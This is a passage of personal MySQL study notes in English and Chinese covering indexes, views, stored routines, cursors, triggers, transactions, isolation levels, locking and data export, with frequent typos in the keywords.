class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> TALBE &lt;table_name&gt;</span><br><span class="line"><span class="keyword">ADD</span> &#123;<span class="keyword">INDEX</span> | <span class="keyword">KEY</span>&#125; [&lt;index_name&gt;] (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line"></span><br><span class="line">CREAR <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> &lt;index_name&gt; <span class="keyword">ON</span> &lt;table_name&gt; (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line">CREAR <span class="keyword">INDEX</span> &lt;index_name&gt; <span class="keyword">ON</span> &lt;table_name&gt; (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line">CREAR FULLTEXT <span class="keyword">INDEX</span> &lt;index_name&gt; <span class="keyword">ON</span> &lt;table_name&gt; (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br></pre></td></tr></table></figure><h4 id="Viewing-Indexes"><a href="#Viewing-Indexes" class="headerlink" title="Viewing Indexes"></a>Viewing Indexes</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">INDEXES</span> <span class="keyword">FROM</span> table_name [<span class="keyword">FROM</span> database_name]</span><br></pre></td></tr></table></figure><h4 id="Removing-Indexes"><a href="#Removing-Indexes" class="headerlink" title="Removing Indexes"></a>Removing Indexes</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> &lt;table_name&gt;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> &lt;index_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> &lt;index_name&gt; <span class="keyword">ON</span> &lt;table_name&gt;</span><br></pre></td></tr></table></figure><h3 id="Creating-and-Managing-Views"><a href="#Creating-and-Managing-Views" class="headerlink" title="Creating and Managing Views"></a>Creating and Managing Views</h3><p>A view is a database object that stores a query raised on one or more tables or other views. The query that contains joins, calculated columns, and subqueries is generally complex.<br>Views help in simplifying the execution of complex queries.</p><h4 id="Creating-Views"><a href="#Creating-Views" class="headerlink" title="Creating Views"></a>Creating Views</h4><p>A view is a virtual table that provides access to subset of columns or records from one or more tables or views. In addition to the columns of tables or other views, a view definition can also contain calculated columns using aggregate functions. View is a query strored as an object in the database and does not have its own data. A view can derived are known as the base tables or underlying tables. A database developer can create views to ensure the security of data by restricting access to</p><ul><li>Specific records of a table.</li><li>Specific columns of a table.</li><li>Specific records and columns of a table.</li><li>Records fetches by using joins.</li><li>Subsets of other views or a subset of views and tables.<br>In addition to restricting access, views can also be used to create and save queries based on multiple tables.<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">OR</span> <span class="keyword">REPLACE</span>]</span><br><span class="line"><span class="keyword">VIEW</span> view_name [(&lt;column_name&gt; [, &lt;column_name&gt;]...)]</span><br><span class="line"><span class="keyword">AS</span> &lt;select_statment&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Querying-Views"><a href="#Querying-Views" class="headerlink" title="Querying Views"></a>Querying Views</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &lt;select_statment&gt; <span class="keyword">FROM</span> &lt;view_name&gt; [<span class="keyword">WHERE</span> &lt;where_condition&gt;]</span><br></pre></td></tr></table></figure><p>View 可以包含 <code>WHERE, ORDER BY, GROUP BY</code></p><h4 id="Restrictions-on-Views"><a href="#Restrictions-on-Views" class="headerlink" title="Restrictions on Views"></a>Restrictions on Views</h4><p>Some of these restriction are</p><ul><li>A view cannot be created on a temporary table.</li><li>A temporary view cannot be created.</li><li>A trigger cannot be created on a view.</li><li>An index cannot be created on a view.</li><li>The underlying table(s) or view(s) of view must already exist.</li><li>The <code>SELECT</code> statement in a view definition cannot contain subqueries in the <code>FROM</code> clause.</li></ul><h4 id="Updatable-Views"><a href="#Updatable-Views" class="headerlink" title="Updatable Views"></a>Updatable Views</h4><p>The views are said to be non-updatable if the following constructs are contained in their defubutuib:</p><ul><li>An aggregate function in the column list.</li><li>The <code>DISTINCT, GROUP BY, HAVING</code> clause in the <code>SELECT</code> statement.</li><li>A subquery in the <code>SELECT</code> statement.</li><li>A nonupdatable view in the <code>FROM</code> clause.</li></ul><p>Insert operations can be performed only on the views that contain all the NOT NULL columns from the underlying table(s) and do not contain any calculated column in the column list.</p><p>Update operation cannot bt performed on a view when</p><ul><li>It modifies the values of the derived columns.</li><li>It results in modification of multiple tables.</li></ul><p>MySQL allows you to perform the dalate operations only on those views that contain columns from a single table.</p><h4 id="Managing-Views"><a href="#Managing-Views" class="headerlink" title="Managing Views"></a>Managing Views</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> [ALFORITHM = &#123;UNDEFINED | <span class="keyword">MERGE</span> | TEMPTABLE&#125;]</span><br><span class="line"><span class="keyword">VIEW</span> view_name [(column_list)]</span><br><span class="line"><span class="keyword">AS</span> &lt;select_statment&gt;</span><br><span class="line">[<span class="keyword">WITH</span> <span class="keyword">CHECK</span> <span class="keyword">OPTION</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] view_name [, view_name]</span><br></pre></td></tr></table></figure><h2 id="Implementing-Compound-Statements-and-Stored-Routines"><a href="#Implementing-Compound-Statements-and-Stored-Routines" class="headerlink" title="Implementing Compound Statements and Stored Routines"></a>Implementing Compound Statements and Stored Routines</h2><p>实现复合语句和储存过程</p><h3 id="Creating-a-Compound-Statement"><a href="#Creating-a-Compound-Statement" class="headerlink" title="Creating a Compound Statement"></a>Creating a Compound Statement</h3><p>复合语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:] <span class="keyword">BEGIN</span></span><br><span class="line">    [statement_list]</span><br><span class="line"><span class="keyword">END</span> [end_label]</span><br></pre></td></tr></table></figure></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="declare"><a href="#declare" class="headerlink" title="declare"></a>declare</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> var_name [, var_name] <span class="keyword">type</span> [<span class="keyword">default</span> <span class="keyword">values</span>]</span><br></pre></td></tr></table></figure><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> variable_assignment [, variable_assignment]</span><br></pre></td></tr></table></figure><h4 id="声明与初始化"><a href="#声明与初始化" class="headerlink" title="声明与初始化"></a>声明与初始化</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Local Variable 局部变量声明必须在begin end之间</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="keyword">var</span> <span class="built_in">int</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">var</span>=<span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gloabal Variable 全局变量可以直接声明</span></span><br><span class="line"><span class="keyword">declare</span> @<span class="keyword">var</span> <span class="built_in">int</span>;</span><br><span class="line"><span class="keyword">set</span> @<span class="keyword">var</span>=<span class="number">15</span>, @age=<span class="number">19</span>;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">delimiter //</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> f(t <span class="built_in">int</span>) <span class="keyword">returns</span> <span class="built_in">int</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">declare</span> age <span class="built_in">int</span>;</span><br><span class="line">    <span class="keyword">set</span> age=t;</span><br><span class="line">    return t;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">//</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><p>好像函数必须要有返回值…</p><h3 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h3><h4 id="IF-THEN-ELSE"><a href="#IF-THEN-ELSE" class="headerlink" title="IF-THEN-ELSE"></a>IF-THEN-ELSE</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IF condition THEN</span><br><span class="line">statements;</span><br><span class="line">[ELSE IF condition THEN</span><br><span class="line">statements;]</span><br><span class="line">[ELSE</span><br><span class="line">statements;]</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br><span class="line">    </span><br><span class="line">IF a&gt;b THEN SET s=CONCAT(a, '&gt;', b);</span><br><span class="line">ELSEIF a=b THEN <span class="keyword">SET</span> s=<span class="keyword">CONCAT</span>(a, <span class="string">'='</span>, b);</span><br><span class="line">else <span class="keyword">set</span> s=<span class="keyword">CONCAT</span>(a, <span class="string">'&lt;'</span>, b);</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">IF</span>;</span><br></pre></td></tr></table></figure><p>如果是elseif只需要一个end if; 如果是else if则需要两个</p><h4 id="CASE"><a href="#CASE" class="headerlink" title="CASE"></a>CASE</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">WHEN value1 THEN</span><br><span class="line">statements;</span><br><span class="line">[WHEN value2 THEN</span><br><span class="line">statements;]</span><br><span class="line">[ELSE</span><br><span class="line">statements;]</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">CASE</span>;</span><br></pre></td></tr></table></figure><h4 id="WHILE"><a href="#WHILE" class="headerlink" title="WHILE"></a>WHILE</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[loopname:] WHILE condition <span class="keyword">DO</span></span><br><span class="line">statements;</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">WHILE</span> [loopname];</span><br></pre></td></tr></table></figure><h4 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:] LOOP</span><br><span class="line">    statement_list</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">LOOP</span> [end_label]</span><br></pre></td></tr></table></figure><p><code>LEAVE lable</code> 可以跳出<code>LOOP, REPEAT, WHILE</code></p><h4 id="ITERATE-statement"><a href="#ITERATE-statement" class="headerlink" title="ITERATE statement"></a>ITERATE statement</h4><p>相当于continue<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ITERATE lable</span><br></pre></td></tr></table></figure></p><h4 id="REPEAT-statement"><a href="#REPEAT-statement" class="headerlink" title="REPEAT statement"></a>REPEAT statement</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:] REPEAT</span><br><span class="line">    statement_list</span><br><span class="line">UNTIL condition</span><br><span class="line"><span class="keyword">END</span> <span class="keyword">REPEAT</span> [end_label]</span><br></pre></td></tr></table></figure><h4 id="Handling-Exceptions"><a href="#Handling-Exceptions" class="headerlink" title="Handling Exceptions"></a>Handling Exceptions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> handler_action <span class="keyword">HANDLER</span></span><br><span class="line">    <span class="keyword">FOR</span> condition_value [, condition_value] ...</span><br><span class="line">    <span class="keyword">statement</span></span><br><span class="line"></span><br><span class="line">handler_action:</span><br><span class="line">    CONTINUE | <span class="keyword">EXIT</span> | <span class="keyword">UNDO</span></span><br><span class="line"></span><br><span class="line">condition_value:</span><br><span class="line">    mysql_error_code | <span class="keyword">SQLSTATE</span> [<span class="keyword">VALUE</span>] sqlstate_value</span><br><span class="line">    | SQLWARNING | <span class="keyword">NOT</span> <span class="keyword">FOUND</span> | SQLEXCEPTION</span><br></pre></td></tr></table></figure><p>异常数值文档<br><a href="https://dev.mysql.com/doc/refman/5.6/en/server-error-reference.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.6/en/server-error-reference.html</a></p><p>返回异常<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SIGNAL SQLSTATE [VALUE] sqlstate_value</span><br><span class="line">[<span class="keyword">SET</span> MESSAGE_TEXT=string_or_variable]</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="string">'45000'</span>, which means “unhandled <span class="keyword">user</span>-defined exception.”</span><br></pre></td></tr></table></figure></p><h4 id="Using-Cursors"><a href="#Using-Cursors" class="headerlink" title="Using Cursors"></a>Using Cursors</h4><p>游标<br>In MySQL cursors can be used inside stored procedures, triggers, and functions. Folloewing steps:</p><ul><li>Declare a cursor 声明</li><li>Open the cursor 打开</li><li>Fetch the cursor 获取</li><li>Close the curson 关闭</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> cursor_name <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> select_statment</span><br><span class="line"><span class="keyword">OPEN</span> cursor_name</span><br><span class="line"><span class="keyword">FETCH</span> cursor_name <span class="keyword">INTO</span> var_name [, var_name] ...;</span><br><span class="line">CLOSE cursor_name</span><br></pre></td></tr></table></figure><h3 id="Implementing-Stored-Routines"><a href="#Implementing-Stored-Routines" class="headerlink" title="Implementing Stored Routines"></a>Implementing Stored Routines</h3><h4 id="Procedures"><a href="#Procedures" class="headerlink" title="Procedures"></a>Procedures</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> proc_name ([[<span class="keyword">IN</span>|<span class="keyword">OUT</span>|INOUT]pro_parameter [, ...]])</span><br><span class="line">    [characteristic ...] routine_body</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> proc_name([parameter[,...]])</span><br></pre></td></tr></table></figure><p><code>IN</code>参数的值必须在调用存储过程时指定，在存储过程中修改该参数的值不能被返回，为默认值<br><code>OUT</code>:该值可在存储过程内部被改变，并可返回<br><code>INOUT</code>:调用时指定，并且可被改变和返回</p><h4 id="Function-1"><a href="#Function-1" class="headerlink" title="Function"></a>Function</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> func_name ([func_parameter[,..]]) <span class="keyword">RETURNS</span> <span class="keyword">type</span></span><br><span class="line">    [characteristic ..] routine_body</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> func_name();</span><br></pre></td></tr></table></figure><h2 id="Implementing-Triggers-and-Transactions"><a href="#Implementing-Triggers-and-Transactions" class="headerlink" title="Implementing Triggers and Transactions"></a>Implementing Triggers and Transactions</h2><h3 id="Triggers"><a href="#Triggers" class="headerlink" title="Triggers"></a>Triggers</h3><p>A triggers can be considered as small program that is pre-compiled and stored in the database. It is automatically executed when a DML statement, such as <code>UPDATE, DELETE, or INSERT</code> is performed on the corresponding table.<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span></span><br><span class="line">    [DEFINER = &#123; <span class="keyword">user</span> | <span class="keyword">CURRENT_USER</span> &#125;]</span><br><span class="line">    <span class="keyword">TRIGGER</span> &lt;trigger_name&gt; &lt;trigger_time&gt; &lt;trigger_event&gt;</span><br><span class="line">    <span class="keyword">ON</span> &lt;table_name&gt; <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span> &lt;trigger_body&gt;</span><br><span class="line"></span><br><span class="line">trigger_time:</span><br><span class="line">    AFER | <span class="keyword">BEFORE</span></span><br><span class="line">trigger_event:</span><br><span class="line">    <span class="keyword">INSERT</span> | <span class="keyword">UPDATE</span> | <span class="keyword">DELETE</span></span><br></pre></td></tr></table></figure></p><p>Restrictions on Triggers</p><ul><li>Any foreign key action does not activate triggers.</li><li>The <code>CALL</code> statement is not permitted inside the trigger body.</li><li>A <code>TEMPORARY</code> table or a view cannot be associated with a trigger.</li><li>The <code>RETURN</code> statement is not permitted in trigger.</li><li>The <code>mysql</code> database does not permit any trigger creation on its tables.</li><li>Statement related to transactions such as <code>COMMIT, ROLLBACK, and START TRANSACTION</code> cannot be executed inside a trigger.</li><li>The trigger cache does not update itself dynamically if any changes are made to the structure of a database object after the information about its structure has been loaded in the cache.</li></ul><p>用<code>NEW | OLD</code>来区分， <code>DELETE</code> 里只有 <code>OLD</code>.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] [schema_name.]trigger_name</span><br></pre></td></tr></table></figure><h3 id="Transactions"><a href="#Transactions" class="headerlink" title="Transactions"></a>Transactions</h3><p>A transaction stands for a series of data manipulation statments encapsulated as a single logical unit of work. This single locical unit of work is executed in a specific sequence and its completion depends on the successful execution of each individual statement within it. If an individual statement fails, the entire logical unit of work will fail.<br>In an RDBMS, whenever an operation is performed, it can be treaded as a reansaction if it has ACID properties. These properties of a transaction can be explained as:</p><ul><li>Atomicity: This means that either all the data-rekated operations in a transaction atr performed or none of them is performed.</li><li>Consistency: This means that all the data is in a consistent state after a transaction is completed successfully.</li><li>Isolation: This delermines whether or not any changes in data by an operation atr made visible to a concurrent transaction.</li><li><p>Durability: This states that any change in data by a completed transaction remains permanently in effect in the system.</p></li><li><p>原子性：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。</p></li><li>一致性：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。</li><li>隔离性：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。</li><li>持久性：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> AUTOCOMMIT=<span class="number">0</span> 禁止自动提交</span><br><span class="line"><span class="keyword">SET</span> AUTOCOMMIT=<span class="number">1</span> 开启自动提交</span><br><span class="line"><span class="keyword">SET</span> sql_safe_updates=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">START</span> <span class="keyword">TRANSACTION</span> 显式地开启一个事务；</span><br><span class="line"><span class="keyword">COMMIT</span> 提交事务，并使已对数据库进行的所有修改成为永久性的；</span><br><span class="line"><span class="keyword">ROLLBACK</span> 回滚会结束用户的事务，并撤销正在进行的所有未提交的修改；</span><br><span class="line"><span class="keyword">SAVEPOINT</span> identifier，<span class="keyword">SAVEPOINT</span> 允许在事务中创建一个保存点，一个事务中可以有多个 <span class="keyword">SAVEPOINT</span>；</span><br><span class="line"><span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> identifier 删除一个事务的保存点，当没有指定的保存点时，执行该语句会抛出一个异常；</span><br><span class="line"><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> SAVAPOINT identifier 把事务回滚到标记点；</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> 用来设置事务的隔离级别</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'tx_isolation'</span> 查看当前数据库的事务隔离级别</span><br></pre></td></tr></table></figure><p>事务的并发问题<br>1、脏读：事务A读取了事务B更新的数据，然后B回滚操作，那么A读取到的数据是脏数据<br>2、不可重复读：事务 A 多次读取同一数据，事务 B 在事务A多次读取的过程中，对数据作了更新并提交，导致事务A多次读取同一数据时，结果 不一致。<br>3、幻读：系统管理员A将数据库中所有学生的成绩从具体分数改为ABCDE等级，但是系统管理员B就在这个时候插入了一条具体分数的记录，当系统管理员A改结束后发现还有一条记录没有改过来，就好像发生了幻觉一样，这就叫幻读。<br>小结：不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表</p><p>MySQL事务隔离级别</p><div class="table-container"><table><thead><tr><th style="text-align:center">事务隔离级别</th><th style="text-align:center">脏读</th><th style="text-align:center">不可重复读</th><th style="text-align:center">幻读</th></tr></thead><tbody><tr><td style="text-align:center">读未提交(READ UNCOMMITTED)</td><td style="text-align:center">是</td><td style="text-align:center">是</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">不可重复读(READ COMMITED)</td><td style="text-align:center">否</td><td style="text-align:center">是</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">可重复读(REPEATABLE READ)</td><td style="text-align:center">否</td><td style="text-align:center">否</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">串行化(SERIALIZABLE)</td><td style="text-align:center">否</td><td style="text-align:center">否</td><td style="text-align:center">否</td></tr></tbody></table></div><p>Mysql 支持4种事务隔离级别. Mysql 默认的事务隔离级别为: REPEATABLE READ<br>a).read uncommitted(读未提交数据)：允许事务读取未被其他事物提交的变更。脏读、不可重复读和幻读的问题都会出现<br>b).read commited(读已提交数据)：只允许事务读取已经被其他事务提交的变更。可避免脏读，但不可重复读和幻读问题仍然存在<br>c).repeatable read(可重复读)：确保事务可以多次从一个字段中读取相同的值，在这个事务持续期间，禁止其他事务对这个字段进行更新。可避免脏读和不可重复读，但幻读的问题仍然存在<br>d).serializable(串行化)：确保事务可以从一个表中读取相同的行，在这个事务持续期间，禁止其他事务对该表执行增删改操作。所有的并发问题都可以避免，但性能什么低下。</p><h4 id="READ-UNCOMMITTED"><a href="#READ-UNCOMMITTED" class="headerlink" title="READ UNCOMMITTED"></a>READ UNCOMMITTED</h4><p>The READ-UNCOMMITTED isolation level specifies that the transactions are able to see the data changes made by other transactions that atr not yet committed.</p><h4 id="READ-COMMITED"><a href="#READ-COMMITED" class="headerlink" title="READ COMMITED"></a>READ COMMITED</h4><p>The READ-COMMITTED isolation level specifies that the data changes are visible to other transactions only when thay are committed.</p><h4 id="REPEATABLE-READ"><a href="#REPEATABLE-READ" class="headerlink" title="REPEATABLE READ"></a>REPEATABLE READ</h4><p>The REPEATABLE-READ isolation level specifies that every read in the transaction will return the same set of data.</p><h4 id="SERIALIZABLE"><a href="#SERIALIZABLE" class="headerlink" title="SERIALIZABLE"></a>SERIALIZABLE</h4><p>The SERIALIZABLE isolation level specifies that transactions place locks on all accessed records and the resource so that records cannot be added, updated, or deleted fron the table used in the transaction.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> [GOLBAL | <span class="keyword">SESSION</span>] <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> &#123;</span><br><span class="line">    <span class="keyword">READ</span> UNCOMMITTED | <span class="keyword">READ</span> COMMITED | REPEATABLE <span class="keyword">READ</span> | <span class="keyword">SERIALIZABLE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><p>MyISAM<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOCK</span> &#123;<span class="keyword">TABLE</span> | <span class="keyword">TABLES</span>&#125;</span><br><span class="line">&lt;table_name&gt; [<span class="keyword">AS</span> &lt;<span class="keyword">alias</span>&gt;] &#123;<span class="keyword">READ</span> [<span class="keyword">LOCAL</span>] | [<span class="keyword">LOW_PRIORITY</span>] WRITE&#125; </span><br><span class="line">[&#123;, &lt;table_name&gt; [<span class="keyword">AS</span> &lt;<span class="keyword">alias</span>&gt;] &#123;<span class="keyword">READ</span> [<span class="keyword">LOCAL</span>] | [<span class="keyword">LOW_PRIORITY</span>] WRITE&#125; &#125;...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">UNLOCK</span> &#123;<span class="keyword">TABLE</span> | <span class="keyword">TABLES</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">OPEN</span> <span class="keyword">TABLES</span>;</span><br></pre></td></tr></table></figure></p><h2 id="导出和导入数据"><a href="#导出和导入数据" class="headerlink" title="导出和导入数据"></a>导出和导入数据</h2><h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;tablename&gt; <span class="keyword">into</span> <span class="keyword">OUTFILE</span> <span class="string">`&lt;filename&gt;`</span> [&lt;export_option&gt;]</span><br><span class="line">&lt;export_option&gt;::=</span><br><span class="line">&#123; <span class="keyword">FIELDS</span></span><br><span class="line">[<span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>]  <span class="comment"># 列结束</span></span><br><span class="line">[[<span class="keyword">OPTIONALLY</span>] <span class="keyword">ENCLOSED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>]   <span class="comment"># 开始和结束</span></span><br><span class="line">[<span class="keyword">ESCAPED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>] &#125;  </span><br><span class="line">| &#123; <span class="keyword">LINES</span></span><br><span class="line">[<span class="keyword">STARTING</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>]     <span class="comment"># 行起始</span></span><br><span class="line"><span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>] &#125;  <span class="comment"># 行结束</span></span><br></pre></td></tr></table></figure><p>貌似高版本无法导出文件，需要在MySQL安装路径里找my.ini，然后在[mysqld]后面加上一句，就能导出了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 